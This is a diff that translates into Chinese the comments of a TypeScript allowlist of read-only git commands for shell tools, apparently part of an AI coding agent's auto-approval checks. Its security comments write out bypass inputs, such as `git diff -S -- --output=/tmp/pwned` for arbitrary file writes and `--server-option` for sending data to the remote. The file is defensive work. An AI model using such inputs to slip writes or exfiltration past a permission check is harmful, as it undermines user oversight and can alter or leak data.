@@ -1,44 +1,44 @@
 /**
- * Shared command validation maps for shell tools (BashTool, PowerShellTool, etc.).
+ * shell 工具（BashTool、PowerShellTool 等）共享的命令校验映射表。
  *
- * Exports complete command configuration maps that any shell tool can import:
- * - GIT_READ_ONLY_COMMANDS: all git subcommands with safe flags and callbacks
- * - GH_READ_ONLY_COMMANDS: ant-only gh CLI commands (network-dependent)
- * - EXTERNAL_READONLY_COMMANDS: cross-shell commands that work in both bash and PowerShell
- * - containsVulnerableUncPath: UNC path detection for credential leak prevention
- * - outputLimits are in outputLimits.ts
+ * 导出任意 shell 工具都可 import 的完整命令配置映射：
+ * - GIT_READ_ONLY_COMMANDS：所有 git 子命令及其安全 flag 和回调
+ * - GH_READ_ONLY_COMMANDS：仅 ant 可用的 gh CLI 命令（依赖网络）
+ * - EXTERNAL_READONLY_COMMANDS：bash 和 PowerShell 中通用的跨 shell 命令
+ * - containsVulnerableUncPath：用于防止凭据泄漏的 UNC 路径检测
+ * - outputLimits 定义在 outputLimits.ts
  */
 
 import { getPlatform } from '../platform.js'
 
 // ---------------------------------------------------------------------------
-// Types
+// 类型
 // ---------------------------------------------------------------------------
 
 export type FlagArgType =
-  | 'none' // No argument (--color, -n)
-  | 'number' // Integer argument (--context=3)
-  | 'string' // Any string argument (--relative=path)
-  | 'char' // Single character (delimiter)
-  | '{}' // Literal "{}" only
-  | 'EOF' // Literal "EOF" only
+  | 'none' // 无参数（--color、-n）
+  | 'number' // 整数参数（--context=3）
+  | 'string' // 任意字符串参数（--relative=path）
+  | 'char' // 单个字符（分隔符）
+  | '{}' // 仅字面量 "{}"
+  | 'EOF' // 仅字面量 "EOF"
 
 export type ExternalCommandConfig = {
   safeFlags: Record<string, FlagArgType>
-  // Returns true if the command is dangerous, false if safe.
-  // args is the list of tokens AFTER the command name (e.g., after "git branch").
+  // 命令危险时返回 true，安全时返回 false。
+  // args 是命令名之后的 token 列表（例如 "git branch" 之后的 token）。
   additionalCommandIsDangerousCallback?: (
     rawCommand: string,
     args: string[],
   ) => boolean
-  // When false, the tool does NOT respect POSIX `--` end-of-options.
-  // validateFlags will continue checking flags after `--` instead of breaking.
-  // Default: true (most tools respect `--`).
+  // 为 false 时，该工具不遵循 POSIX `--` 选项终止符。
+  // validateFlags 会继续校验 `--` 之后的 flag，而不是中断。
+  // 默认：true（大多数工具遵循 `--`）。
   respectsDoubleDash?: boolean
 }
 
 // ---------------------------------------------------------------------------
-// Shared git flag groups
+// 共享的 git flag 分组
 // ---------------------------------------------------------------------------
 
 const GIT_REF_SELECTION_FLAGS: Record<string, FlagArgType> = {
@@ -69,7 +69,7 @@ const GIT_COUNT_FLAGS: Record<string, FlagArgType> = {
   '-n': 'number',
 }
 
-// Stat output flags - used in git log, show, diff
+// 统计输出 flag - 用于 git log、show、diff
 const GIT_STAT_FLAGS: Record<string, FlagArgType> = {
   '--stat': 'none',
   '--numstat': 'none',
@@ -78,13 +78,13 @@ const GIT_STAT_FLAGS: Record<string, FlagArgType> = {
   '--name-status': 'none',
 }
 
-// Color output flags - used in git log, show, diff
+// 颜色输出 flag - 用于 git log、show、diff
 const GIT_COLOR_FLAGS: Record<string, FlagArgType> = {
   '--color': 'none',
   '--no-color': 'none',
 }
 
-// Patch display flags - used in git log, show
+// patch 展示 flag - 用于 git log、show
 const GIT_PATCH_FLAGS: Record<string, FlagArgType> = {
   '--patch': 'none',
   '-p': 'none',
@@ -93,7 +93,7 @@ const GIT_PATCH_FLAGS: Record<string, FlagArgType> = {
   '-s': 'none',
 }
 
-// Author/committer filter flags - used in git log, reflog
+// author/committer 过滤 flag - 用于 git log、reflog
 const GIT_AUTHOR_FILTER_FLAGS: Record<string, FlagArgType> = {
   '--author': 'string',
   '--committer': 'string',
@@ -101,7 +101,7 @@ const GIT_AUTHOR_FILTER_FLAGS: Record<string, FlagArgType> = {
 }
 
 // ---------------------------------------------------------------------------
-// GIT_READ_ONLY_COMMANDS — complete map of all git subcommands
+// GIT_READ_ONLY_COMMANDS — 所有 git 子命令的完整映射
 // ---------------------------------------------------------------------------
 
 export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
@@ -109,7 +109,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     safeFlags: {
       ...GIT_STAT_FLAGS,
       ...GIT_COLOR_FLAGS,
-      // Display and comparison flags
+      // 展示与比较 flag
       '--dirstat': 'none',
       '--summary': 'none',
       '--patch-with-stat': 'none',
@@ -146,9 +146,9 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--pickaxe-all': 'none',
       '--no-index': 'none',
       '--relative': 'string',
-      // Diff filtering
+      // diff 过滤
       '--diff-filter': 'string',
-      // Short flags
+      // 短 flag
       '-p': 'none',
       '-u': 'none',
       '-s': 'none',
@@ -157,15 +157,14 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-B': 'none',
       '-D': 'none',
       '-l': 'none',
-      // SECURITY: -S/-G/-O take REQUIRED string arguments (pickaxe search,
-      // pickaxe regex, orderfile). Previously 'none' caused a parser
-      // differential with git: `git diff -S -- --output=/tmp/pwned` —
-      // validator sees -S as no-arg → advances 1 token → breaks on `--` →
-      // --output unchecked. git sees -S requires arg → consumes `--` as the
-      // pickaxe string (standard getopt: required-arg options consume next
-      // argv unconditionally, BEFORE the top-level `--` check) → cursor at
-      // --output=... → parses as long option → ARBITRARY FILE WRITE.
-      // git log config at line ~207 correctly has -S/-G as 'string'.
+      // 安全：-S/-G/-O 接受必需的字符串参数（pickaxe 搜索、pickaxe 正则、
+      // orderfile）。之前标成 'none' 会造成与 git 的解析差异：
+      // `git diff -S -- --output=/tmp/pwned` — validator 视 -S 无参 →
+      // 前进 1 个 token → 在 `--` 处中断 → --output 未被检查。git 视
+      // -S 需要参数 → 把 `--` 当作 pickaxe 字符串消耗掉（标准 getopt：
+      // 必需参数的选项无条件消费下一个 argv，且在顶层 `--` 检查之前）
+      // → 游标落到 --output=... → 当作长选项解析 → 任意文件写入。
+      // 第 ~207 行的 git log 配置正确地把 -S/-G 标为 'string'。
       '-S': 'string',
       '-G': 'string',
       '-O': 'string',
@@ -182,7 +181,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       ...GIT_COLOR_FLAGS,
       ...GIT_PATCH_FLAGS,
       ...GIT_AUTHOR_FILTER_FLAGS,
-      // Additional display flags
+      // 额外的展示 flag
       '--abbrev-commit': 'none',
       '--full-history': 'none',
       '--dense': 'none',
@@ -201,22 +200,22 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--no-min-parents': 'none',
       '--no-max-parents': 'none',
       '--follow': 'none',
-      // Commit traversal flags
+      // commit 遍历 flag
       '--no-walk': 'none',
       '--left-right': 'none',
       '--cherry-mark': 'none',
       '--cherry-pick': 'none',
       '--boundary': 'none',
-      // Ordering flags
+      // 排序 flag
       '--topo-order': 'none',
       '--date-order': 'none',
       '--author-date-order': 'none',
-      // Format control
+      // 格式控制
       '--pretty': 'string',
       '--format': 'string',
-      // Diff filtering
+      // diff 过滤
       '--diff-filter': 'string',
-      // Pickaxe search (find commits that add/remove string)
+      // pickaxe 搜索（查找新增/删除某字符串的 commit）
       '-S': 'string',
       '-G': 'string',
       '--pickaxe-regex': 'none',
@@ -229,7 +228,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       ...GIT_STAT_FLAGS,
       ...GIT_COLOR_FLAGS,
       ...GIT_PATCH_FLAGS,
-      // Additional display flags
+      // 额外的展示 flag
       '--abbrev-commit': 'none',
       '--word-diff': 'none',
       '--word-diff-regex': 'string',
@@ -238,9 +237,9 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--format': 'string',
       '--first-parent': 'none',
       '--raw': 'none',
-      // Diff filtering
+      // diff 过滤
       '--diff-filter': 'string',
-      // Short flags
+      // 短 flag
       '-m': 'none',
       '--quiet': 'none',
     },
@@ -249,7 +248,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
     safeFlags: {
       ...GIT_REF_SELECTION_FLAGS,
       ...GIT_DATE_FILTER_FLAGS,
-      // Summary options
+      // 汇总选项
       '-s': 'none',
       '--summary': 'none',
       '-n': 'none',
@@ -258,11 +257,11 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--email': 'none',
       '-c': 'none',
       '--committer': 'none',
-      // Grouping
+      // 分组
       '--group': 'string',
-      // Formatting
+      // 格式化
       '--format': 'string',
-      // Filtering
+      // 过滤
       '--no-merges': 'none',
       '--author': 'string',
     },
@@ -275,31 +274,31 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       ...GIT_COUNT_FLAGS,
       ...GIT_AUTHOR_FILTER_FLAGS,
     },
-    // SECURITY: Block `git reflog expire` (positional subcommand) — it writes
-    // to .git/logs/** by expiring reflog entries. `git reflog delete` similarly
-    // writes. Only `git reflog` (bare = show) and `git reflog show` are safe.
-    // The positional-arg fallthrough at ~:1730 would otherwise accept `expire`
-    // as a non-flag arg, and `--all` is in GIT_REF_SELECTION_FLAGS → passes.
+    // 安全：拦截 `git reflog expire`（位置型子命令）— 它通过让 reflog
+    // 条目过期来写入 .git/logs/**。`git reflog delete` 同样会写入。
+    // 只有 `git reflog`（裸命令 = show）和 `git reflog show` 是安全的。
+    // 否则 ~:1730 处的位置参数兜底分支会把 `expire` 当作非 flag 参数接受，
+    // 而 `--all` 又在 GIT_REF_SELECTION_FLAGS 中 → 校验通过。
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
     ) => {
-      // Block known write-capable subcommands: expire, delete, exists.
-      // Allow: `show`, ref names (HEAD, refs/*, branch names).
-      // The subcommand (if any) is the first positional arg. Subsequent
-      // positionals after `show` or after flags are ref names (safe).
+      // 拦截已知具备写入能力的子命令：expire、delete、exists。
+      // 放行：`show`、ref 名（HEAD、refs/*、分支名）。
+      // 子命令（若有）是第一个位置参数。`show` 之后或 flag 之后的位置参数
+      // 都是 ref 名（安全）。
       const DANGEROUS_SUBCOMMANDS = new Set(['expire', 'delete', 'exists'])
       for (const token of args) {
         if (!token || token.startsWith('-')) continue
-        // First non-flag positional: check if it's a dangerous subcommand.
-        // If it's `show` or a ref name like `HEAD`/`refs/...`, safe.
+        // 第一个非 flag 位置参数：检查是否是危险子命令。
+        // 如果是 `show` 或诸如 `HEAD`/`refs/...` 的 ref 名，则安全。
         if (DANGEROUS_SUBCOMMANDS.has(token)) {
-          return true // Dangerous subcommand — writes to .git/logs/**
+          return true // 危险子命令 — 会写入 .git/logs/**
         }
-        // First positional is safe (show/HEAD/ref) — subsequent are ref args
+        // 第一个位置参数安全（show/HEAD/ref）— 后续都是 ref 参数
         return false
       }
-      return false // No positional = bare `git reflog` = safe (shows reflog)
+      return false // 无位置参数 = 裸 `git reflog` = 安全（仅展示 reflog）
     },
   },
   'git stash list': {
@@ -311,7 +310,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   },
   'git ls-remote': {
     safeFlags: {
-      // Branch/tag filtering flags
+      // 分支/标签过滤 flag
       '--branches': 'none',
       '-b': 'none',
       '--tags': 'none',
@@ -319,28 +318,25 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--heads': 'none',
       '-h': 'none',
       '--refs': 'none',
-      // Output control flags
+      // 输出控制 flag
       '--quiet': 'none',
       '-q': 'none',
       '--exit-code': 'none',
       '--get-url': 'none',
       '--symref': 'none',
-      // Sorting flags
+      // 排序 flag
       '--sort': 'string',
-      // Protocol flags
-      // SECURITY: --server-option and -o are INTENTIONALLY EXCLUDED. They
-      // transmit an arbitrary attacker-controlled string to the remote git
-      // server in the protocol v2 capability advertisement. This is a network
-      // WRITE primitive (sending data to remote) on what is supposed to be a
-      // read-only command. Even without command substitution (which is caught
-      // elsewhere), `--server-option="sensitive-data"` exfiltrates the value
-      // to whatever `origin` points to. The read-only path should never enable
-      // network writes.
+      // 协议 flag
+      // 安全：--server-option 和 -o 被刻意排除。它们会在 protocol v2
+      // capability 通告中把任意攻击者控制的字符串发送到远端 git 服务器。
+      // 这相当于在理应只读的命令上引入了网络写入原语（向远端发送数据）。
+      // 即使没有命令替换（已由其他地方拦截），`--server-option="敏感数据"`
+      // 也会把该值外发到 `origin` 指向的地址。只读路径绝不应启用网络写入。
     },
   },
   'git status': {
     safeFlags: {
-      // Output format flags
+      // 输出格式 flag
       '--short': 'none',
       '-s': 'none',
       '--branch': 'none',
@@ -349,19 +345,19 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--long': 'none',
       '--verbose': 'none',
       '-v': 'none',
-      // Untracked files handling
+      // untracked 文件处理
       '--untracked-files': 'string',
       '-u': 'string',
-      // Ignore options
+      // ignore 选项
       '--ignored': 'none',
       '--ignore-submodules': 'string',
-      // Column display
+      // 列展示
       '--column': 'none',
       '--no-column': 'none',
-      // Ahead/behind info
+      // ahead/behind 信息
       '--ahead-behind': 'none',
       '--no-ahead-behind': 'none',
-      // Rename detection
+      // 重命名检测
       '--renames': 'none',
       '--no-renames': 'none',
       '--find-renames': 'string',
@@ -371,9 +367,9 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   'git blame': {
     safeFlags: {
       ...GIT_COLOR_FLAGS,
-      // Line range
+      // 行范围
       '-L': 'string',
-      // Output format
+      // 输出格式
       '--porcelain': 'none',
       '-p': 'none',
       '--line-porcelain': 'none',
@@ -386,20 +382,20 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--show-email': 'none',
       '-e': 'none',
       '-f': 'none',
-      // Date formatting
+      // 日期格式化
       '--date': 'string',
-      // Ignore whitespace
+      // 忽略空白
       '-w': 'none',
-      // Ignore revisions
+      // 忽略 revision
       '--ignore-rev': 'string',
       '--ignore-revs-file': 'string',
-      // Move/copy detection
+      // 移动/复制检测
       '-M': 'none',
       '-C': 'none',
       '--score-debug': 'none',
-      // Abbreviation
+      // 缩写
       '--abbrev': 'number',
-      // Other options
+      // 其他选项
       '-s': 'none',
       '-l': 'none',
       '-t': 'none',
@@ -407,7 +403,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   },
   'git ls-files': {
     safeFlags: {
-      // File selection
+      // 文件筛选
       '--cached': 'none',
       '-c': 'none',
       '--deleted': 'none',
@@ -424,7 +420,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-k': 'none',
       '--unmerged': 'none',
       '-u': 'none',
-      // Output format
+      // 输出格式
       '--directory': 'none',
       '--no-empty-directory': 'none',
       '--eol': 'none',
@@ -435,22 +431,22 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-t': 'none',
       '-v': 'none',
       '-f': 'none',
-      // Exclude patterns
+      // exclude 模式
       '--exclude': 'string',
       '-x': 'string',
       '--exclude-from': 'string',
       '-X': 'string',
       '--exclude-per-directory': 'string',
       '--exclude-standard': 'none',
-      // Error handling
+      // 错误处理
       '--error-unmatch': 'none',
-      // Recursion
+      // 递归
       '--recurse-submodules': 'none',
     },
   },
   'git config --get': {
     safeFlags: {
-      // No additional flags needed - just reading config values
+      // 无需额外 flag - 只是读取 config 值
       '--local': 'none',
       '--global': 'none',
       '--system': 'none',
@@ -469,19 +465,19 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--show-scope': 'none',
     },
   },
-  // NOTE: 'git remote show' must come BEFORE 'git remote' so longer patterns are matched first
+  // 注意：'git remote show' 必须排在 'git remote' 之前，这样更长的模式才能优先匹配
   'git remote show': {
     safeFlags: {
       '-n': 'none',
     },
-    // Only allow optional -n, then one alphanumeric remote name
+    // 仅允许可选的 -n，随后接受一个字母数字组成的 remote 名
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
     ) => {
-      // Filter out the known safe flag
+      // 过滤掉已知的安全 flag
       const positional = args.filter(a => a !== '-n')
-      // Must have exactly one positional arg that looks like a remote name
+      // 必须恰好有一个看起来像 remote 名的位置参数
       if (positional.length !== 1) return true
       return !/^[a-zA-Z0-9_-]+$/.test(positional[0]!)
     },
@@ -491,43 +487,43 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-v': 'none',
       '--verbose': 'none',
     },
-    // Only allow bare 'git remote' or 'git remote -v/--verbose'
+    // 仅允许裸 'git remote' 或 'git remote -v/--verbose'
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
     ) => {
-      // All args must be known safe flags; no positional args allowed
+      // 所有参数都必须是已知安全 flag；不允许位置参数
       return args.some(a => a !== '-v' && a !== '--verbose')
     },
   },
-  // git merge-base is a read-only command for finding common ancestors
+  // git merge-base 是只读命令 — 用于查找共同祖先
   'git merge-base': {
     safeFlags: {
-      '--is-ancestor': 'none', // Check if first commit is ancestor of second
-      '--fork-point': 'none', // Find fork point
-      '--octopus': 'none', // Find best common ancestors for multiple refs
-      '--independent': 'none', // Filter independent refs
-      '--all': 'none', // Output all merge bases
+      '--is-ancestor': 'none', // 检查第一个 commit 是否是第二个的祖先
+      '--fork-point': 'none', // 查找分叉点
+      '--octopus': 'none', // 为多个 ref 查找最佳共同祖先
+      '--independent': 'none', // 过滤独立的 ref
+      '--all': 'none', // 输出所有 merge base
     },
   },
-  // git rev-parse is a pure read command — resolves refs to SHAs, queries repo paths
+  // git rev-parse 是纯读命令 — 把 ref 解析为 SHA，或查询仓库路径
   'git rev-parse': {
     safeFlags: {
-      // SHA resolution and verification
-      '--verify': 'none', // Verify that exactly one argument is a valid object name
-      '--short': 'string', // Abbreviate output (optional length via =N)
-      '--abbrev-ref': 'none', // Symbolic name of ref
-      '--symbolic': 'none', // Output symbolic names
-      '--symbolic-full-name': 'none', // Full symbolic name including refs/heads/ prefix
-      // Repository path queries (all read-only)
-      '--show-toplevel': 'none', // Absolute path of top-level directory
-      '--show-cdup': 'none', // Path components to traverse up to top-level
-      '--show-prefix': 'none', // Relative path from top-level to cwd
-      '--git-dir': 'none', // Path to .git directory
-      '--git-common-dir': 'none', // Path to common directory (.git in main worktree)
-      '--absolute-git-dir': 'none', // Absolute path to .git directory
-      '--show-superproject-working-tree': 'none', // Superproject root (if submodule)
-      // Boolean queries
+      // SHA 解析与校验
+      '--verify': 'none', // 校验恰好一个参数是合法对象名
+      '--short': 'string', // 缩写输出（可通过 =N 指定长度）
+      '--abbrev-ref': 'none', // ref 的符号名
+      '--symbolic': 'none', // 输出符号名
+      '--symbolic-full-name': 'none', // 完整符号名（含 refs/heads/ 前缀）
+      // 仓库路径查询（全部只读）
+      '--show-toplevel': 'none', // 顶层目录的绝对路径
+      '--show-cdup': 'none', // 返回顶层所需向上穿越的路径分量
+      '--show-prefix': 'none', // 从顶层到 cwd 的相对路径
+      '--git-dir': 'none', // .git 目录路径
+      '--git-common-dir': 'none', // 公共目录路径（主 worktree 的 .git）
+      '--absolute-git-dir': 'none', // .git 目录的绝对路径
+      '--show-superproject-working-tree': 'none', // 父项目根目录（子模块场景）
+      // 布尔查询
       '--is-inside-work-tree': 'none',
       '--is-inside-git-dir': 'none',
       '--is-bare-repository': 'none',
@@ -536,16 +532,16 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--path-prefix': 'none',
     },
   },
-  // git rev-list is read-only commit enumeration — lists/counts commits reachable from refs
+  // git rev-list 是只读的 commit 枚举 — 列出/统计从 ref 可达的 commit
   'git rev-list': {
     safeFlags: {
       ...GIT_REF_SELECTION_FLAGS,
       ...GIT_DATE_FILTER_FLAGS,
       ...GIT_COUNT_FLAGS,
       ...GIT_AUTHOR_FILTER_FLAGS,
-      // Counting
-      '--count': 'none', // Output commit count instead of listing
-      // Traversal control
+      // 计数
+      '--count': 'none', // 输出 commit 数量而非列表
+      // 遍历控制
       '--reverse': 'none',
       '--first-parent': 'none',
       '--ancestry-path': 'none',
@@ -559,7 +555,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--max-age': 'number',
       '--min-age': 'number',
       '--walk-reflogs': 'none',
-      // Output formatting
+      // 输出格式化
       '--oneline': 'none',
       '--abbrev-commit': 'none',
       '--pretty': 'string',
@@ -572,135 +568,135 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '--graph': 'none',
     },
   },
-  // git describe is read-only — describes commits relative to the most recent tag
+  // git describe 是只读命令 — 相对最近的 tag 描述 commit
   'git describe': {
     safeFlags: {
-      // Tag selection
-      '--tags': 'none', // Consider all tags, not just annotated
-      '--match': 'string', // Only consider tags matching the glob pattern
-      '--exclude': 'string', // Do not consider tags matching the glob pattern
-      // Output control
-      '--long': 'none', // Always output long format (tag-distance-ghash)
-      '--abbrev': 'number', // Abbreviate objectname to N hex digits
-      '--always': 'none', // Show uniquely abbreviated object as fallback
-      '--contains': 'none', // Find tag that comes after the commit
-      '--first-match': 'none', // Prefer tags closest to the tip (stops after first match)
-      '--exact-match': 'none', // Only output if an exact match (tag points at commit)
-      '--candidates': 'number', // Limit walk before selecting best candidates
-      // Suffix/dirty markers
-      '--dirty': 'none', // Append "-dirty" if working tree has modifications
-      '--broken': 'none', // Append "-broken" if repository is in invalid state
+      // tag 选择
+      '--tags': 'none', // 考虑所有 tag，不只是 annotated tag
+      '--match': 'string', // 只考虑匹配 glob 模式的 tag
+      '--exclude': 'string', // 排除匹配 glob 模式的 tag
+      // 输出控制
+      '--long': 'none', // 始终使用长格式输出（tag-distance-ghash）
+      '--abbrev': 'number', // 把对象名缩写为 N 位十六进制
+      '--always': 'none', // 兜底输出唯一缩写的对象名
+      '--contains': 'none', // 查找 commit 之后的 tag
+      '--first-match': 'none', // 优先选择离 tip 最近的 tag（首个匹配后停止）
+      '--exact-match': 'none', // 仅在精确匹配时输出（tag 指向 commit）
+      '--candidates': 'number', // 在选出最佳候选前限制遍历范围
+      // 后缀/dirty 标记
+      '--dirty': 'none', // 工作区有改动时追加 "-dirty"
+      '--broken': 'none', // 仓库处于非法状态时追加 "-broken"
     },
   },
-  // git cat-file is read-only object inspection — displays type, size, or content of objects
-  // NOTE: --batch (without --check) is intentionally excluded — it reads arbitrary objects
-  // from stdin which could be exploited in piped commands to dump sensitive objects.
+  // git cat-file 是只读对象查看 — 展示对象的类型、大小或内容
+  // 注意：--batch（不带 --check）被刻意排除 — 它会从 stdin 读取任意对象，
+  // 在管道命令中可能被利用来 dump 敏感对象。
   'git cat-file': {
     safeFlags: {
-      // Object query modes (all purely read-only)
-      '-t': 'none', // Print type of object
-      '-s': 'none', // Print size of object
-      '-p': 'none', // Pretty-print object contents
-      '-e': 'none', // Exit with zero if object exists, non-zero otherwise
-      // Batch mode — read-only check variant only
-      '--batch-check': 'none', // For each object on stdin, print type and size (no content)
-      // Output control
+      // 对象查询模式（全部纯只读）
+      '-t': 'none', // 打印对象类型
+      '-s': 'none', // 打印对象大小
+      '-p': 'none', // 友好打印对象内容
+      '-e': 'none', // 对象存在则 exit 0，否则非零
+      // 批处理模式 — 仅允许只读 check 变体
+      '--batch-check': 'none', // 对 stdin 上的每个对象，输出类型和大小（不含内容）
+      // 输出控制
       '--allow-undetermined-type': 'none',
     },
   },
-  // git for-each-ref is read-only ref iteration — lists refs with optional formatting and filtering
+  // git for-each-ref 是只读 ref 遍历 — 列出 ref，可附带格式化和过滤
   'git for-each-ref': {
     safeFlags: {
-      // Output formatting
-      '--format': 'string', // Format string using %(fieldname) placeholders
-      // Sorting
-      '--sort': 'string', // Sort by key (e.g., refname, creatordate, version:refname)
-      // Limiting
-      '--count': 'number', // Limit output to at most N refs
-      // Filtering
-      '--contains': 'string', // Only list refs that contain specified commit
-      '--no-contains': 'string', // Only list refs that do NOT contain specified commit
-      '--merged': 'string', // Only list refs reachable from specified commit
-      '--no-merged': 'string', // Only list refs NOT reachable from specified commit
-      '--points-at': 'string', // Only list refs pointing at specified object
+      // 输出格式化
+      '--format': 'string', // 使用 %(字段名) 占位符的格式串
+      // 排序
+      '--sort': 'string', // 按 key 排序（如 refname、creatordate、version:refname）
+      // 数量限制
+      '--count': 'number', // 最多输出 N 条 ref
+      // 过滤
+      '--contains': 'string', // 仅列出包含指定 commit 的 ref
+      '--no-contains': 'string', // 仅列出不含指定 commit 的 ref
+      '--merged': 'string', // 仅列出从指定 commit 可达的 ref
+      '--no-merged': 'string', // 仅列出从指定 commit 不可达的 ref
+      '--points-at': 'string', // 仅列出指向指定对象的 ref
     },
   },
-  // git grep is read-only — searches tracked files for patterns
+  // git grep 是只读命令 — 在被追踪的文件中搜索模式
   'git grep': {
     safeFlags: {
-      // Pattern matching modes
-      '-e': 'string', // Pattern
-      '-E': 'none', // Extended regexp
+      // 模式匹配模式
+      '-e': 'string', // 模式
+      '-E': 'none', // 扩展正则
       '--extended-regexp': 'none',
-      '-G': 'none', // Basic regexp (default)
+      '-G': 'none', // 基本正则（默认）
       '--basic-regexp': 'none',
-      '-F': 'none', // Fixed strings
+      '-F': 'none', // 固定字符串
       '--fixed-strings': 'none',
-      '-P': 'none', // Perl regexp
+      '-P': 'none', // Perl 正则
       '--perl-regexp': 'none',
-      // Match control
-      '-i': 'none', // Ignore case
+      // 匹配控制
+      '-i': 'none', // 忽略大小写
       '--ignore-case': 'none',
-      '-v': 'none', // Invert match
+      '-v': 'none', // 反转匹配
       '--invert-match': 'none',
-      '-w': 'none', // Word regexp
+      '-w': 'none', // 单词正则
       '--word-regexp': 'none',
-      // Output control
-      '-n': 'none', // Line number
+      // 输出控制
+      '-n': 'none', // 行号
       '--line-number': 'none',
-      '-c': 'none', // Count
+      '-c': 'none', // 计数
       '--count': 'none',
-      '-l': 'none', // Files with matches
+      '-l': 'none', // 列出匹配的文件
       '--files-with-matches': 'none',
-      '-L': 'none', // Files without match
+      '-L': 'none', // 列出未匹配的文件
       '--files-without-match': 'none',
-      '-h': 'none', // No filename
-      '-H': 'none', // With filename
+      '-h': 'none', // 不显示文件名
+      '-H': 'none', // 显示文件名
       '--heading': 'none',
       '--break': 'none',
       '--full-name': 'none',
       '--color': 'none',
       '--no-color': 'none',
-      '-o': 'none', // Only matching
+      '-o': 'none', // 仅输出匹配部分
       '--only-matching': 'none',
-      // Context
-      '-A': 'number', // After context
+      // 上下文
+      '-A': 'number', // after 上下文
       '--after-context': 'number',
-      '-B': 'number', // Before context
+      '-B': 'number', // before 上下文
       '--before-context': 'number',
-      '-C': 'number', // Context
+      '-C': 'number', // 上下文
       '--context': 'number',
-      // Boolean operators for multi-pattern
+      // 多模式布尔操作符
       '--and': 'none',
       '--or': 'none',
       '--not': 'none',
-      // Scope control
+      // 作用域控制
       '--max-depth': 'number',
       '--untracked': 'none',
       '--no-index': 'none',
       '--recurse-submodules': 'none',
       '--cached': 'none',
-      // Threads
+      // 线程
       '--threads': 'number',
-      // Quiet
+      // 静默
       '-q': 'none',
       '--quiet': 'none',
     },
   },
-  // git stash show is read-only — displays diff of a stash entry
+  // git stash show 是只读命令 — 展示某个 stash 条目的 diff
   'git stash show': {
     safeFlags: {
       ...GIT_STAT_FLAGS,
       ...GIT_COLOR_FLAGS,
       ...GIT_PATCH_FLAGS,
-      // Diff options
+      // diff 选项
       '--word-diff': 'none',
       '--word-diff-regex': 'string',
       '--diff-filter': 'string',
       '--abbrev': 'number',
     },
   },
-  // git worktree list is read-only — lists linked working trees
+  // git worktree list 是只读命令 — 列出已链接的 working tree
   'git worktree list': {
     safeFlags: {
       '--porcelain': 'none',
@@ -711,7 +707,7 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
   },
   'git tag': {
     safeFlags: {
-      // List mode flags
+      // 列表模式 flag
       '-l': 'none',
       '--list': 'none',
       '-n': 'number',
@@ -727,22 +723,21 @@ export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
       '-i': 'none',
       '--ignore-case': 'none',
     },
-    // SECURITY: Block tag creation via positional arguments. `git tag foo`
-    // creates .git/refs/tags/foo (41-byte file write) — NOT read-only.
-    // This is identical semantics to `git branch foo` (which has the same
-    // callback below). Without this callback, validateFlags's default
-    // positional-arg fallthrough at ~:1730 accepts `mytag` as a non-flag arg,
-    // and git tag auto-approves. While the write is constrained (path limited
-    // to .git/refs/tags/, content is fixed HEAD SHA), it violates the
-    // read-only invariant and can pollute CI/CD tag-pattern matching or make
-    // abandoned commits reachable via `git tag foo <commit>`.
+    // 安全：拦截通过位置参数创建 tag 的行为。`git tag foo` 会创建
+    // .git/refs/tags/foo（写入一个 41 字节的文件）— 不是只读。
+    // 这与下方 `git branch foo` 语义相同（callback 也一样）。如果没有这个
+    // callback，validateFlags 在 ~:1730 处的默认位置参数兜底分支会把
+    // `mytag` 当作非 flag 参数接受，于是 git tag 被自动放行。虽然这次
+    // 写入是受限的（路径仅限 .git/refs/tags/，内容固定为 HEAD 的 SHA），
+    // 但它破坏了只读不变式，并可能污染 CI/CD 的 tag 模式匹配，或通过
+    // `git tag foo <commit>` 让被遗弃的 commit 重新可达。
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
     ) => {
-      // Safe uses: `git tag` (list), `git tag -l pattern` (list filtered),
-      // `git tag --contains <ref>` (list containing). A bare positional arg
-      // without -l/--list is a tag name to CREATE — dangerous.
+      // 安全用法：`git tag`（列表）、`git tag -l pattern`（过滤列表）、
